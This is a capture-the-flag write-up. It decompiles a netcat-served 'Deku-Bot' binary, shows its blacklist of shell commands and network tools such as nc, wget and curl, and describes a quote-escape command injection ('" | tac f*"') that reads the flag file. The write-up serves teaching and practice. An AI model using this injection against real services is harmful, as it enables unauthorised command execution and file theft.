# The Analyst's Logic Leak

## Challenge

![challenge](challenge.png)

## Solution

Let's try connecting to their netcat listener

```bash
nc 178.128.110.55 26810   
Booting Deku-Bot... Connection Established.
Type 'quit' to end the hero training session.

You> asdfasdf
---------------------------------------------------------
[ HERO ANALYSIS LOG: MIDORIYA'S NOTEBOOK FOR THE FUTURE ]
---------------------------------------------------------
It looks like you might have accidentally typed some random characters. Is there something specific you'd like to talk about or ask? I'm here to help with any questions you have.
--------------------------------------------------------
[ END OF LOG - PLUS ULTRA! ]


You>
```

It inputs text and then spits out something based on the input. Like an AI chatbot but it can't be since it's only a small one file executable binary.

Let's decompile the code shall we (with ghidra).

```c
undefined8 main(void)

{
  int user_exit;
  char *is_empty;
  size_t length;
  char input [512];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  signal(14,sessionExpiry);
  alarm(180);
  puts("Booting Deku-Bot... Connection Established.");
  puts("Type \'quit\' to end the hero training session.");
  while( true ) {
    printf("\nYou> ");
    is_empty = fgets(input,512,stdin);
    if (is_empty == (char *)0) {
      return 0;
    }
    length = strcspn(input,"\n");
    input[length] = '\0';
    user_exit = strcmp(input,"quit");
    if ((user_exit == 0) || (user_exit = strcmp(input,"exit"), user_exit == 0)) break;
    dekuBot(input);
  }
  puts("Deku-Bot> Oh! Goodbye! I\'ll keep these notes safe! See you at the Sports Festival!");
  return 0;
}



undefined8 blacklistInput(char *input)

{
  char *pcVar1;
  long i;
  undefined **keyCopy;
  undefined8 *puVar2;
  char inputCopy [511];
  undefined1 local_129;
  undefined8 local_128 [35];
  uint counter;
  int j;
  
  keyCopy = &key;
  puVar2 = local_128;
                    /* Copies the blacklist to a local variable */
                    /* The blacklist contians the following:
                       flag
                       cat 
                       /flag
                       cat$
                       more
                       less
                       tail
                       head
                       ;
                       &&
                       ||
                       `
                       $
                       (
                       $
                       {
                       >
                       >>
                       <
                       bash
                       sh -
                       nc 
                       wget
                       curl
                       python
                       perl
                       ruby
                       exec
                       systeme
                       val
                       /bin/
                       /usr/bin/
                       xarg
                       str 
                       printf 
                       awk */
  for (i = 34; i != 0; i = i + -1) {
    *puVar2 = *keyCopy;
    keyCopy = keyCopy + 1;
    puVar2 = puVar2 + 1;
  }
  strncpy(inputCopy,input,511);
  local_129 = 0;
                    /* copies input and lower cases it */
  for (j = 0; inputCopy[j] != '\0'; j = j + 1) {
    if (('@' < inputCopy[j]) && (inputCopy[j] < '[')) {
      inputCopy[j] = inputCopy[j] + ' ';
    }
  }
  counter = 0;
  while( true ) {
    if (33 < counter) {
      return 0;
    }
    pcVar1 = strstr(inputCopy,(char *)local_128[(int)counter]);
                    /* compares the input to the blacklist variable */
    if (pcVar1 != (char *)0) break;
    counter = counter + 1;
  }
  return 1;
}
```

Hmmm, looks like it just runs input in linux commands but blacklists anything that would easily get us the flag. 

We can escape out of the input with `"` to close it then we can start executing actual linux commands. `flag` and `flag.txt` are out but we can just use `f*` to get anything that starts with 'f'. We can't use `;`,`&&`,`||`, and others but looks like regular pipe `|` is allowed. Now the only issue is getting the contents of a file but if the netcat listener is coming from a standard linux distribution, then we should have tac which is at but in reverse output.

```bash
nc 178.128.110.55 26810
Booting Deku-Bot... Connection Established.
Type 'quit' to end the hero training session.

You> " | tac f*"
---------------------------------------------------------
[ HERO ANALYSIS LOG: MIDORIYA'S NOTEBOOK FOR THE FUTURE ]
---------------------------------------------------------
h3r0c0rp{d37r017_5m45h_h175_h4rd3r_w17h_0n3_f0r_4ll_47_100_p3rc3n7}
--------------------------------------------------------
[ END OF LOG - PLUS ULTRA! ]


You> 
```

## FLAG

```text
h3r0c0rp{d37r017_5m45h_h175_h4rd3r_w17h_0n3_f0r_4ll_47_100_p3rc3n7}
```
